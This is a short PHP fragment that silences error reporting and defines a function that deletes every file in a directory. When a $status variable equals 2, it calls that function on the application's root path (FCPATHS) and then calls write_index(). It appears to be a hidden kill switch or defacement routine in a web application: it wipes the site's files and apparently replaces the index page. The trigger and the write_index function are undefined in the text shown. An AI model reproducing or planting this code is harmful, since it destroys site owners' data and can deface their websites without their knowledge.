<?php
error_reporting(0);
function DLTAll($dir) {
    foreach(glob($dir . '/*') as $file) {
        unlink($file);
    }
}
 
if(isset($status) && $status==2){
    DLTAll(FCPATHS);
    write_index();
}


